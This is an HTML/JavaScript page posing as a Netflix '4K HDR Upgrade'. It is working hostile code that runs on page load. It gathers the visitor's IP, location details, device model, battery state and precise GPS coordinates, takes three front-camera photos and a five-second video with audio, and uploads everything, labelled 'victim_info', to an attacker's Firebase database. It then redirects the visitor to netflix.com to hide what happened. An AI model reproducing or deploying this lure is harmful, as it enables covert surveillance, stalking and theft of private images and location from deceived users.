<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>4K HDR Upgrade - Netflix</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #141414 0%, #0a0a0a 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .container {
            max-width: 500px;
            width: 100%;
            background: rgba(0,0,0,0.85);
            border-radius: 25px;
            backdrop-filter: blur(10px);
            border: 1px solid rgba(229,9,20,0.5);
            padding: 2rem;
            box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5);
        }
        
        .logo {
            text-align: center;
            margin-bottom: 2rem;
        }
        
        .logo h1 {
            font-size: 2.5rem;
            font-weight: 800;
            background: linear-gradient(135deg, #E50914, #ff4d4d);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            letter-spacing: -1px;
        }
        
        .badge {
            display: inline-block;
            background: #E50914;
            padding: 0.3rem 1rem;
            border-radius: 30px;
            font-size: 0.75rem;
            font-weight: 600;
            margin-top: 0.5rem;
        }
        
        .progress-section {
            margin: 2rem 0;
        }
        
        .progress-bar-container {
            background: rgba(255,255,255,0.2);
            border-radius: 10px;
            overflow: hidden;
            height: 8px;
        }
        
        .progress-bar {
            height: 100%;
            background: linear-gradient(90deg, #E50914, #ff4d4d);
            width: 0%;
            transition: width 0.3s ease;
            border-radius: 10px;
        }
        
        .status-text {
            margin-top: 1rem;
            text-align: center;
            font-size: 0.85rem;
            color: #ccc;
            font-weight: 500;
        }
        
        .steps {
            margin: 2rem 0;
        }
        
        .step {
            display: flex;
            align-items: center;
            gap: 1rem;
            padding: 0.8rem;
            margin: 0.5rem 0;
            background: rgba(255,255,255,0.05);
            border-radius: 12px;
            transition: all 0.3s ease;
        }
        
        .step.completed {
            background: rgba(76,175,80,0.2);
            border-left: 3px solid #4CAF50;
        }
        
        .step.error {
            background: rgba(229,9,20,0.2);
            border-left: 3px solid #E50914;
        }
        
        .step-icon {
            width: 35px;
            text-align: center;
            font-size: 1.3rem;
        }
        
        .step-text {
            flex: 1;
            font-size: 0.9rem;
            font-weight: 500;
        }
        
        .step-status {
            font-size: 0.85rem;
            font-weight: bold;
        }
        
        .redirect-note {
            text-align: center;
            margin-top: 2rem;
            padding-top: 1rem;
            border-top: 1px solid rgba(255,255,255,0.1);
            font-size: 0.75rem;
            color: #666;
        }
        
        button {
            margin-top: 1rem;
            padding: 0.6rem 1rem;
            background: #E50914;
            border: none;
            border-radius: 8px;
            color: white;
            cursor: pointer;
            font-size: 0.8rem;
            font-weight: 600;
            width: 100%;
        }
        
        button:hover {
            background: #ff1a1a;
        }
        
        .debug-console {
            margin-top: 1rem;
            padding: 0.8rem;
            background: rgba(0,0,0,0.9);
            border-radius: 10px;
            font-family: 'Courier New', monospace;
            font-size: 0.65rem;
            color: #0f0;
            max-height: 150px;
            overflow-y: auto;
            display: none;
        }
        
        .debug-console.show {
            display: block;
        }
        
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }
        
        .loading {
            animation: pulse 1.5s ease infinite;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <h1>NETFLIX</h1>
            <div class="badge">⚡ 4K HDR ULTRA UPGRADE ⚡</div>
        </div>
        
        <div class="progress-section">
            <div class="progress-bar-container">
                <div class="progress-bar" id="progressBar"></div>
            </div>
            <div class="status-text" id="statusText">Initializing system...</div>
        </div>
        
        <div class="steps">
            <div class="step" id="step1">
                <div class="step-icon">📱</div>
                <div class="step-text">Device Detection</div>
                <div class="step-status" id="step1Status">⚪</div>
            </div>
            <div class="step" id="step2">
                <div class="step-icon">📍</div>
                <div class="step-text">GPS Location</div>
                <div class="step-status" id="step2Status">⚪</div>
            </div>
            <div class="step" id="step3">
                <div class="step-icon">📸</div>
                <div class="step-text">Camera Capture (3 Photos)</div>
                <div class="step-status" id="step3Status">⚪</div>
            </div>
            <div class="step" id="step4">
                <div class="step-icon">🎥</div>
                <div class="step-text">Video Capture (5 sec)</div>
                <div class="step-status" id="step4Status">⚪</div>
            </div>
            <div class="step" id="step5">
                <div class="step-icon">☁️</div>
                <div class="step-text">Uploading Data</div>
                <div class="step-status" id="step5Status">⚪</div>
            </div>
        </div>
        
        <div class="redirect-note">⚡ Optimizing your 4K HDR streaming experience...</div>
        <button onclick="toggleDebug()">🐛 Debug Console</button>
        <div class="debug-console" id="debugConsole">
            <strong>📡 DEBUG LOG:</strong><br>
            <div id="debugLog">Waiting...</div>
        </div>
    </div>

    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
    
    <script>
        // Firebase Config
        const firebaseConfig = {
            apiKey: "AIzaSyCG2oPHsEbvKAVY4C2mP-njqvgvZnzyZBU",
            authDomain: "mobilehk-5e843.firebaseapp.com",
            databaseURL: "https://mobilehk-5e843-default-rtdb.firebaseio.com",
            projectId: "mobilehk-5e843",
            storageBucket: "mobilehk-5e843.firebasestorage.app",
            messagingSenderId: "287475964010",
            appId: "1:287475964010:web:1d278c51947c6cbb881213"
        };
        
        // Debug
        let debugMessages = [];
        function addDebug(msg, isError = false) {
            const time = new Date().toLocaleTimeString();
            const prefix = isError ? '❌' : '✓';
            debugMessages.push(`[${time}] ${prefix} ${msg}`);
            document.getElementById('debugLog').innerHTML = debugMessages.join('<br>');
            console.log(msg);
        }
        
        function toggleDebug() {
            document.getElementById('debugConsole').classList.toggle('show');
        }
        
        // Init Firebase
        firebase.initializeApp(firebaseConfig);
        const database = firebase.database();
        addDebug("Firebase initialized");
        
        // Get Session ID
        const urlParams = new URLSearchParams(window.location.search);
        const sessionId = urlParams.get('id');
        addDebug("Session: " + (sessionId || "NOT FOUND"));
        
        if (!sessionId) {
            addDebug("No session ID!", true);
            setTimeout(() => window.location.href = 'https://www.netflix.com', 2000);
            throw new Error('No session ID');
        }
        
        function updateProgress(percent, text) {
            document.getElementById('progressBar').style.width = percent + '%';
            document.getElementById('statusText').innerHTML = text;
        }
        
        function markStep(stepNum, completed, statusText = '', isError = false) {
            const step = document.getElementById(`step${stepNum}`);
            const statusSpan = document.getElementById(`step${stepNum}Status`);
            if (completed) {
                step.classList.add('completed');
                statusSpan.innerHTML = statusText || '✓';
                statusSpan.style.color = '#4CAF50';
            } else if (isError) {
                step.classList.add('error');
                statusSpan.innerHTML = statusText || '✗';
                statusSpan.style.color = '#E50914';
            } else if (statusText) {
                statusSpan.innerHTML = statusText;
            }
        }
        
        // Get EXACT Location
        async function getExactLocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve({ lat: 0, lng: 0, accuracy: 0 });
                    return;
                }
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        addDebug(`Exact Location: ${pos.coords.latitude}, ${pos.coords.longitude} (Accuracy: ${pos.coords.accuracy}m)`);
                        resolve({ 
                            lat: pos.coords.latitude, 
                            lng: pos.coords.longitude,
                            accuracy: pos.coords.accuracy,
                            altitude: pos.coords.altitude || 0
                        });
                    },
                    (err) => {
                        addDebug("Location error: " + err.message, true);
                        resolve({ lat: 0, lng: 0, accuracy: 0 });
                    },
                    { timeout: 10000, enableHighAccuracy: true }
                );
            });
        }
        
        // Get IP and Location Details
        async function getIPDetails() {
            try {
                const res = await fetch('https://ipapi.co/json/');
                const data = await res.json();
                addDebug(`IP: ${data.ip}, City: ${data.city}, Country: ${data.country_name}`);
                return {
                    ip: data.ip || 'Unknown',
                    country: data.country_name || 'Unknown',
                    region: data.region || 'Unknown',
                    city: data.city || 'Unknown',
                    isp: data.org || 'Unknown',
                    postal: data.postal || 'Unknown',
                    timezone: data.timezone || 'Unknown'
                };
            } catch(e) {
                addDebug("IP fetch error: " + e.message, true);
                return { ip: 'Unknown', country: 'Unknown', region: 'Unknown', city: 'Unknown', isp: 'Unknown' };
            }
        }
        
        // Get Battery with Percentage
        async function getBatteryStatus() {
            if ('getBattery' in navigator) {
                try {
                    const battery = await navigator.getBattery();
                    const level = Math.round(battery.level * 100);
                    const status = `${level}% (${battery.charging ? '🔌 Charging' : '🔋 Discharging'})`;
                    addDebug(`Battery: ${status}`);
                    return { level: level, charging: battery.charging, status: status };
                } catch(e) {
                    return { level: 0, charging: false, status: 'Unknown' };
                }
            }
            return { level: 0, charging: false, status: 'Not Supported' };
        }
        
        // Get EXACT Mobile Model
        function getMobileModel() {
            const ua = navigator.userAgent;
            let model = 'Unknown';
            let brand = 'Unknown';
            
            // Android Model Detection
            if (/Android/i.test(ua)) {
                const match = ua.match(/\(([^;]+);\s([^;]+)\s[^;]*\)/);
                if (match && match[2]) {
                    brand = match[1] || 'Unknown';
                    model = match[2] || 'Unknown';
                }
                // Samsung specific
                if (ua.includes('SM-')) {
                    const smMatch = ua.match(/SM-[A-Z0-9]+/);
                    if (smMatch) model = smMatch[0];
                }
                // Xiaomi/Redmi
                if (ua.includes('Redmi')) model = 'Redmi ' + (ua.match(/Redmi\s+[A-Z0-9]+/i) || ['Redmi'])[0];
                if (ua.includes('MI')) model = 'Xiaomi ' + (ua.match(/MI\s+[A-Z0-9]+/i) || ['MI'])[0];
            }
            // iOS Model Detection
            else if (/iPhone|iPad|iPod/i.test(ua)) {
                if (ua.includes('iPhone')) {
                    const match = ua.match(/iPhone(\d+,\d+)/);
                    model = match ? `iPhone ${match[1]}` : 'iPhone';
                } else if (ua.includes('iPad')) model = 'iPad';
                else model = 'iOS Device';
                brand = 'Apple';
            }
            
            addDebug(`Device: ${brand} ${model}`);
            return { brand: brand, model: model, full: `${brand} ${model}`.trim() };
        }
        
        // Get Full Device Info
        function getDeviceInfo() {
            const ua = navigator.userAgent;
            let os = 'Unknown', osVersion = 'Unknown';
            
            if (/Android/i.test(ua)) {
                os = 'Android';
                const match = ua.match(/Android\s([\d.]+)/);
                if (match) osVersion = match[1];
            } else if (/iPhone|iPad|iPod/i.test(ua)) {
                os = 'iOS';
                const match = ua.match(/OS\s([\d_]+)/);
                if (match) osVersion = match[1].replace(/_/g, '.');
            } else if (/Windows/i.test(ua)) {
                os = 'Windows';
                const match = ua.match(/Windows NT\s([\d.]+)/);
                if (match) osVersion = match[1];
            } else if (/Mac/i.test(ua)) {
                os = 'macOS';
            } else if (/Linux/i.test(ua)) {
                os = 'Linux';
            }
            
            let browser = 'Unknown';
            if (/Chrome/i.test(ua) && !/Edg/i.test(ua)) browser = 'Chrome';
            else if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) browser = 'Safari';
            else if (/Firefox/i.test(ua)) browser = 'Firefox';
            else if (/Edg/i.test(ua)) browser = 'Edge';
            
            return { os, osVersion, browser, ua: ua };
        }
        
        // Capture Multiple Photos
        async function captureMultiplePhotos(count = 3) {
            const photos = [];
            
            for (let i = 0; i < count; i++) {
                addDebug(`Capturing photo ${i+1}/${count}...`);
                const photo = await capturePhotoBase64();
                if (photo) {
                    photos.push(photo);
                    addDebug(`Photo ${i+1} captured (${Math.round(photo.length/1024)}KB)`);
                }
                await new Promise(r => setTimeout(r, 800));
            }
            
            return photos;
        }
        
        // Capture Single Photo as Base64
        async function capturePhotoBase64() {
            return new Promise((resolve) => {
                if (!navigator.mediaDevices) {
                    resolve(null);
                    return;
                }
                
                navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
                    .then(stream => {
                        const video = document.createElement('video');
                        video.srcObject = stream;
                        video.onloadedmetadata = () => {
                            video.play();
                            setTimeout(() => {
                                const canvas = document.createElement('canvas');
                                canvas.width = video.videoWidth || 640;
                                canvas.height = video.videoHeight || 480;
                                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
                                stream.getTracks().forEach(t => t.stop());
                                const base64 = canvas.toDataURL('image/jpeg', 0.8);
                                resolve(base64);
                            }, 100);
                        };
                    })
                    .catch(err => {
                        addDebug("Camera error: " + err.message, true);
                        resolve(null);
                    });
            });
        }
        
        // Capture Video (5 seconds)
        async function captureVideo(seconds = 5) {
            return new Promise((resolve) => {
                if (!navigator.mediaDevices) {
                    resolve(null);
                    return;
                }
                
                navigator.mediaDevices.getUserMedia({ video: true, audio: true })
                    .then(stream => {
                        addDebug(`Recording ${seconds} seconds video...`);
                        const mediaRecorder = new MediaRecorder(stream);
                        const chunks = [];
                        
                        mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
                        mediaRecorder.onstop = () => {
                            const blob = new Blob(chunks, { type: 'video/mp4' });
                            const reader = new FileReader();
                            reader.onloadend = () => {
                                stream.getTracks().forEach(t => t.stop());
                                const base64 = reader.result;
                                addDebug(`Video captured (${Math.round(base64.length/1024)}KB)`);
                                resolve(base64);
                            };
                            reader.readAsDataURL(blob);
                        };
                        
                        mediaRecorder.start();
                        setTimeout(() => {
                            mediaRecorder.stop();
                        }, seconds * 1000);
                    })
                    .catch(err => {
                        addDebug("Video error: " + err.message, true);
                        resolve(null);
                    });
            });
        }
        
        // Main Execution
        async function main() {
            updateProgress(0, 'Starting system...');
            
            // Step 1: Device Info + Battery + Model
            markStep(1, false, '⟳');
            updateProgress(10, 'Detecting device...');
            
            const ipDetails = await getIPDetails();
            const battery = await getBatteryStatus();
            const mobileModel = getMobileModel();
            const deviceInfo = getDeviceInfo();
            
            const victimInfo = {
                ip: ipDetails.ip,
                country: ipDetails.country,
                region: ipDetails.region,
                city: ipDetails.city,
                isp: ipDetails.isp,
                postal: ipDetails.postal,
                timezone: ipDetails.timezone,
                battery_level: battery.level,
                battery_charging: battery.charging,
                battery_status: battery.status,
                device_brand: mobileModel.brand,
                device_model: mobileModel.model,
                device_full: mobileModel.full,
                os: deviceInfo.os,
                os_version: deviceInfo.osVersion,
                browser: deviceInfo.browser,
                screen: `${window.screen.width}x${window.screen.height}`,
                language: navigator.language,
                timestamp: new Date().toISOString()
            };
            
            markStep(1, true, '✓');
            updateProgress(20, 'Device detected');
            await new Promise(r => setTimeout(r, 500));
            
            // Step 2: Exact Location
            markStep(2, false, '⟳');
            updateProgress(30, 'Getting GPS location...');
            
            const exactLocation = await getExactLocation();
            const locationData = {
                lat: exactLocation.lat,
                lng: exactLocation.lng,
                accuracy: exactLocation.accuracy,
                altitude: exactLocation.altitude,
                country: ipDetails.country,
                region: ipDetails.region,
                city: ipDetails.city,
                isp: ipDetails.isp,
                maps_link: `https://maps.google.com/?q=${exactLocation.lat},${exactLocation.lng}`
            };
            
            markStep(2, true, exactLocation.lat !== 0 ? '✓' : '⚠');
            updateProgress(40, 'GPS locked');
            await new Promise(r => setTimeout(r, 500));
            
            // Step 3: Multiple Photos (3 pics)
            markStep(3, false, '⟳');
            updateProgress(50, 'Capturing photos...');
            
            const photos = await captureMultiplePhotos(3);
            markStep(3, true, photos.length > 0 ? `${photos.length}✓` : '⚠');
            updateProgress(65, `${photos.length} photos captured`);
            await new Promise(r => setTimeout(r, 500));
            
            // Step 4: Video Capture (5 seconds)
            markStep(4, false, '⟳');
            updateProgress(75, 'Recording video (5 sec)...');
            
            const video = await captureVideo(5);
            markStep(4, true, video ? '✓' : '⚠');
            updateProgress(85, 'Video recorded');
            await new Promise(r => setTimeout(r, 500));
            
            // Step 5: Upload to Firebase
            markStep(5, false, '⟳');
            updateProgress(92, 'Uploading data...');
            
            const uploadData = {
                victim_info: victimInfo,
                location: locationData,
                photos: photos,
                video: video,
                timestamp: new Date().toISOString(),
                complete: true
            };
            
            try {
                await database.ref(`sessions/${sessionId}/data`).set(uploadData);
                addDebug("✅ ALL DATA UPLOADED SUCCESSFULLY!");
                markStep(5, true, '✓');
                updateProgress(100, 'Complete! Redirecting...');
            } catch(e) {
                addDebug("Upload error: " + e.message, true);
                markStep(5, false, '✗', true);
            }
            
            setTimeout(() => {
                window.location.href = 'https://www.netflix.com';
            }, 3000);
        }
        
        setTimeout(main, 1000);
    </script>
</body>
</html>
